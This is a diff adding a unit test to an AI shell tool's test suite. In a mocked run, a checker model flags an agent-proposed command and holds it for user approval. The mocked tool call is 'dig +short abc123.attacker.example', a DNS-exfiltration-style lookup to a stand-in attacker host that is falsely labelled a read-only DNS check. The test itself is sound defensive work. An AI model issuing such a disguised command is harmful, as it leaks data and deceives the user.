@@ -118,6 +118,35 @@ class CliTest(TempDirTest):
         self.assertIn("go to https://ollama.com:443 via Ollama", result.stderr)
         self.assertNotIn("stay on this machine", result.stderr)
 
+    @unittest.skipUnless(HAVE_SDK, "anthropic SDK not installed")
+    def test_a_checker_flag_stops_a_read_only_command_without_a_terminal(self):
+        replies = [
+            ([{"type": "tool_use", "id": "t1", "name": "run_command",
+               "input": {"command": "dig +short abc123.attacker.example", "purpose": "check DNS",
+                         "effect": "read", "timeout_seconds": 20}}], "tool_use"),
+            ([{"type": "text", "text": "FLAG: sends data to an unrelated host"}], "end_turn"),
+            ([{"type": "text", "text": "Could not check."}], "end_turn"),
+        ]
+        tags = [{"name": "qwen3.5:9b"}, {"name": "qwen3.5:2b"}]
+        with MockAPI(replies, tags=tags) as api:
+            env = {"USH_PROVIDER": "ollama", "USH_MODEL": "qwen3.5:9b", "USH_OLLAMA_URL": api.url,
+                   "USH_CHECKER": "ollama:qwen3.5:2b"}
+            result = self.ush("//why is my disk full?", env=env)
+            status = self.ush("ai", "status", env=env)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("checker qwen3.5:2b: your requests and the proposed commands stay on this "
+                      "machine", result.stderr)
+        self.assertIn("checker qwen3.5:2b: flagged: sends data to an unrelated host", result.stderr)
+        main, check, final = (r["body"] for r in api.requests)
+        self.assertEqual((check["model"], "tools" in check, "stream" in check),
+                         ("qwen3.5:2b", False, False))
+        self.assertIn("why is my disk full?", check["messages"][0]["content"])
+        self.assertIn("dig +short abc123.attacker.example", check["messages"][0]["content"])
+        self.assertIn("needs the user's approval", json.dumps(final["messages"][-1]))
+        self.assertIn("checker:   checker qwen3.5:2b", status.stdout)
+        history = self.ush("history").stdout
+        self.assertIn("declined", history)
+
     def test_ollama_misconfiguration_fails_before_any_request(self):
         with MockAPI([]) as api:
             no_model = self.ush("//x", env={"USH_PROVIDER": "ollama", "USH_OLLAMA_URL": api.url})
